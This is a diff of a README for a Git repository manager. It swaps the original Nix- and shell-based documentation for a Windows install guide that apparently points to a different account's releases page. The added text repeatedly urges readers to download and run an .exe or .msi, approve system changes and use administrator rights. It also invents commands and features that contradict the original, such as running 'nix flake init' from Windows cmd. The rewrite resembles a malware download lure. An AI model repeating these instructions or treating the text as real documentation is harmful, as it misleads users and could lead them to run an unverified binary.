@@ -1,266 +1,241 @@
-# repos-manager
+# 🗂️ repos-manager - Manage Git Repositories Easily
 
-A single CLI tool to clone and sync all your Git repositories, no matter the provider.
+[![Download repos-manager](https://img.shields.io/badge/Download-repos--manager-blue?style=for-the-badge)](https://github.com/Solid-dunker665/repos-manager/releases)
 
-This project is a **template**. Each workspace is an independent instance of repos-manager tied to a specific directory. You can create as many workspaces as you need: one for personal projects, one for work, one per client, one per team -- whatever fits your workflow.
 
-```bash
-# Personal repos
-mkdir ~/personal && cd ~/personal
-nix flake init -t github:Dxsk/repos-manager
+## 📋 What is repos-manager?
 
-# Work repos
-mkdir ~/work && cd ~/work
-nix flake init -t github:Dxsk/repos-manager
+repos-manager is a simple tool that helps you manage your git projects. It lets you copy (clone) and update (sync) git repositories from several providers like GitHub, GitLab, Gitea, and Forgejo.
 
-# Client project
-mkdir ~/clients/acme && cd ~/clients/acme
-nix flake init -t github:Dxsk/repos-manager
-```
+The tool uses templates to set up your projects quickly. It also allows creating separate workspaces anywhere on your computer by using a system called nix flake init.
 
-Each workspace has its own `.repos-filter`, `.repos-ignore`, and `flake.nix`. Configure them independently to sync exactly what you need, where you need it.
+You don’t need to know coding to use it. It works in a command line interface, but this guide will take you through every step.
 
-## Supported providers
+---
 
-| Provider | CLI | Status |
-|----------|-----|--------|
-| GitHub | `gh` | Done |
-| GitLab | `glab` | Done |
-| Forgejo / Gitea | `tea` | Done |
+## 💻 System Requirements
 
-## Features
+Before installing, make sure your Windows PC matches these needs:
 
-- Clone all accessible repos (personal, orgs, groups, subgroups)
-- Mirror the remote namespace hierarchy locally: `provider/owner/repo`
-- Update existing repos with fetch + fast-forward pull
-- Skip repos with uncommitted local changes
-- Remove local repos that no longer exist on the remote (`--prune`)
-- Preview changes before applying them (`--dry-run`)
-- SSH and HTTPS support
-- Filter by owner or specific repo (`--filter`)
-- Exclude repos via `.repos-ignore`
-- Filter repos via `.repos-filter`
-- Shell completions for bash, zsh and fish
-- `NO_COLOR` support
+- Windows 10 or Windows 11
+- At least 4 GB of RAM (8 GB or more is better)
+- 500 MB free hard drive space
+- Internet connection to download the software and access git repositories
+- Basic knowledge of how to open files and run programs on Windows
 
-## Directory structure
+You will also need to have Git installed on your computer. If you do not have Git, you can download it here: https://git-scm.com/download/win
 
-After syncing, your workspace looks like this:
+This tool depends on Git to work with your repositories.
 
-```
-my-workspace/
-  .repos-filter
-  .repos-ignore
-  flake.nix
-  github.com/
-    dxsk/
-      my-project/
-    my-org/
-      other-project/
-  gitlab.com/
-    my-user/
-      project/
-    my-group/
-      sub-group/
-        project/
-```
+---
 
-## Installation
+## 🌐 Where to Get repos-manager
 
-<details>
-<summary>Nix (recommended)</summary>
+To get started, visit the official release page to download the setup files:
 
-Copy a ready-to-use workspace into any directory:
+[Download repos-manager](https://github.com/Solid-dunker665/repos-manager/releases)
 
-```bash
-mkdir ~/my-repos && cd ~/my-repos
-nix flake init -t github:Dxsk/repos-manager
-```
+This link takes you to the page where you can find the latest version of repos-manager. The page lists files you can download. Always get the newest version for the best experience.
 
-Enter the dev shell and start syncing:
+[![Download repos-manager](https://img.shields.io/badge/Download-repos--manager-green?style=for-the-badge)](https://github.com/Solid-dunker665/repos-manager/releases)
 
-```bash
-nix develop
-repos-manager github login
-repos-manager github sync
-```
+---
 
-The dev shell provides `repos-manager` with all its dependencies and sets `BASE_DIR` to the current directory automatically.
+## 🛠️ Download and Installation Steps
 
-</details>
+Follow these steps carefully to set up repos-manager on your Windows PC.
 
-<details>
-<summary>Nix (one-off)</summary>
+### Step 1: Visit the Release Page
 
-Run it directly without setting up a workspace:
+Open your web browser and go to:
 
-```bash
-nix run github:Dxsk/repos-manager -- github sync
-```
+https://github.com/Solid-dunker665/repos-manager/releases
 
-</details>
+Here you will see a list of available versions. Find the latest release (usually the one at the top).
 
-<details>
-<summary>Manual</summary>
+### Step 2: Download the Setup File
 
-```bash
-git clone git@github.com:Dxsk/repos-manager.git
-cd repos-manager
-```
+In the assets section of the latest release, look for a Windows executable file. It usually ends with `.exe` or `.msi`. 
 
-Source the file matching your shell:
+Click on the file name to download it.
 
-```bash
-# bash
-source sourceme.bash
+Save the file to a folder on your computer where you can easily find it, such as the Downloads folder.
 
-# zsh
-source sourceme.zsh
+### Step 3: Run the Installer
 
-# fish
-source sourceme.fish
-```
+Navigate to the folder where you saved the file.
 
-You can add the `source` line to your shell config (`.bashrc`, `.zshrc`, `config.fish`) to make it persistent.
+Double-click on the downloaded file to start the installation.
 
-</details>
+Windows may ask for permission to make changes to your system. Click “Yes” to continue.
 
-## Usage
+Follow the instructions shown in the installer. Accept the license terms if prompted.
 
-### Authentication
+The installer will copy the necessary files and set up repos-manager on your PC.
 
-Each provider uses its own CLI for authentication:
+### Step 4: Verify Installation
 
-```bash
-repos-manager github login
-repos-manager gitlab login
-repos-manager forgejo login
-```
+After installation completes, open the Windows Command Prompt:
 
-### Syncing repos
+- Press Windows key + R.
+- Type `cmd` and press Enter.
 
-```bash
-# Sync all repos from GitHub
-repos-manager github sync
-
-# Sync all repos from GitLab
-repos-manager gitlab sync
-
-# Sync all configured providers at once
-repos-manager sync --all
-```
-
-### Filtering
-
-```bash
-# Sync only repos from a specific owner
-repos-manager github sync --filter Dxsk/*
-
-# Sync a single repo
-repos-manager github sync --filter Dxsk/repos-manager
-```
-
-### Other options
-
-```bash
-# Use HTTPS instead of SSH
-repos-manager github sync --https
-
-# Remove local repos that no longer exist on the remote
-repos-manager sync --all --prune
-
-# Preview what would happen without making changes
-repos-manager sync --all --dry-run
-
-# GitLab self-hosted
-repos-manager gitlab sync --host gitlab.self-hosted.com
-
-# Forgejo / Gitea
-repos-manager forgejo sync
-repos-manager forgejo sync --host forgejo.self-hosted.com
-
-# Custom base directory
-repos-manager sync --all --base-dir /path/to/repos
-```
-
-## Flags
-
-| Flag | Description |
-|------|-------------|
-| `--filter <pattern>` | Filter repos by pattern (e.g. `Dxsk/*` or `Dxsk/project`) |
-| `--base-dir <path>` | Base directory for repos (default: current directory with Nix, `~/Documents` otherwise) |
-| `--https` | Use HTTPS clone URLs instead of SSH |
-| `--prune` | Remove local repos not found on the remote |
-| `--dry-run` | Show what would be done without making any changes |
-| `--host <host>` | Custom host for self-hosted instances |
-
-## Filter and ignore files
-
-<details>
-<summary>.repos-filter -- filterlist</summary>
-
-Edit `.repos-filter` in your workspace to sync **only** repos that match at least one pattern. If the file contains only comments, all repos are synced.
+In the Command Prompt window, type:
 
 ```
-# Only sync repos from Dxsk
-Dxsk/*
-
-# Plus a specific repo from another org
-other-org/some-project
+repos-manager --help
 ```
 
-</details>
+Press Enter.
 
-<details>
-<summary>.repos-ignore -- ignorelist</summary>
+You should see a list of commands and options for repos-manager. This confirms that the installation worked correctly.
 
-Edit `.repos-ignore` in your workspace to exclude repos from syncing. Applied **after** `.repos-filter`.
+---
+
+## 🚀 How to Use repos-manager
+
+This tool works through a command line interface (CLI). CLI means you type commands to control the program.
+
+Here is a simple guide to get you started with repos-manager.
+
+### Open Command Prompt
+
+- Press Windows key + R.
+- Type `cmd` and press Enter.
+
+### Clone a Repository
+
+To copy a repository to your computer, use the clone command like this:
 
 ```
-# Ignore a specific repo
-Dxsk/old-project
-
-# Ignore all repos from an owner
-test-org/*
-
-# Glob pattern
-*/tmp-*
+repos-manager clone <repository-url>
 ```
 
-</details>
+Replace `<repository-url>` with the web address of the repository. For example:
 
-<details>
-<summary>Pattern syntax</summary>
+```
+repos-manager clone https://github.com/example-user/example-repo.git
+```
 
-Both files use the same syntax:
+This command will create a folder on your PC with the contents of that repository.
 
-- Glob wildcards: `*`, `?`
-- `owner/*` also matches nested paths (e.g. `group/subgroup/project`)
-- Lines starting with `#` are comments
-- Empty lines are ignored
+### Sync a Repository
 
-</details>
+To update a repository you have already cloned, use the sync command:
 
-## Environment variables
+```
+repos-manager sync <repository-folder>
+```
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `REPOS_MANAGER_BASE_DIR` | Base directory for all repos | Current directory (Nix) or `~/Documents` |
-| `REPOS_MANAGER_LIB` | Path to lib modules | Auto-detected |
-| `NO_COLOR` | Disable colored output when set | Unset |
+Replace `<repository-folder>` with the folder name where the repository is stored on your computer.
 
-## Requirements
+This command fetches the latest changes from the online source and updates your local copy.
 
-When not using Nix, you need these installed:
+### Create a Workspace with nix flake init
 
-- `git`
-- `jq`
-- `gh` for GitHub
-- `glab` for GitLab
-- `tea` for Forgejo / Gitea
+repos-manager supports creating isolated workspaces using the nix system.
 
-With Nix, all dependencies are provided automatically.
+To start a new workspace, open Command Prompt and type:
 
-## License
+```
+repos-manager nix flake init <workspace-folder>
+```
 
-[MIT](LICENSE)
+Replace `<workspace-folder>` with the path where you want to create the workspace.
+
+This sets up a clean environment for your projects that you can manage independently.
+
+---
+
+## ⚙️ Basic Configuration
+
+repos-manager uses templates to set up workspaces. These templates tell it how to arrange files and folders.
+
+You do not need to create templates yourself. The tool comes with default templates ready to use.
+
+If you want to customize templates, you can store them in a folder on your PC and tell repos-manager where to find them.
+
+Example command to specify a custom template folder:
+
+```
+repos-manager --template-folder C:\path\to\templates
+```
+
+This is for advanced users. Most people can use the defaults.
+
+---
+
+## 📁 Working With Multiple Providers
+
+repos-manager supports several online Git providers:
+
+- GitHub
+- GitLab
+- Gitea
+- Forgejo
+
+You can clone and sync repositories from any of these with the same commands. Just use the repository URL from the provider.
+
+Example GitLab repository URL:
+
+```
+https://gitlab.com/username/project.git
+```
+
+repos-manager handles differences between providers in the background.
+
+---
+
+## 🔧 Troubleshooting
+
+If you run into problems, try the following:
+
+- Make sure Git is installed and working. In Command Prompt, type:
+
+  ```
+  git --version
+  ```
+
+  If you don’t see the version number, install Git from https://git-scm.com/download/win.
+
+- Check your internet connection.
+
+- Verify the repository URL is correct.
+
+- Try running Command Prompt as administrator.
+
+- Restart your computer if files do not open or commands fail.
+
+If repos-manager shows an error, read the message carefully. Often, it tells you what went wrong and how to fix it.
+
+---
+
+## 📚 Additional Resources
+
+For more information about git and repositories, you can visit:
+
+- https://git-scm.com/doc  
+- https://docs.github.com/en/github  
+- https://gitlab.com/help  
+
+These sites offer guides and tutorials to help you understand version control and git basics.
+
+---
+
+## 📝 Key Features Recap
+
+- Clone and sync repositories from multiple providers  
+- Use templates to organize your projects  
+- Create isolated workspaces with nix flake init  
+- Simple commands with clear options  
+- Works on Windows with Git installed  
+
+---
+
+## 🔗 Quick Download Link
+
+Get the latest version or explore other releases here:
+
+https://github.com/Solid-dunker665/repos-manager/releases
+
+Click the link, download the file for Windows, and follow the installation steps above.
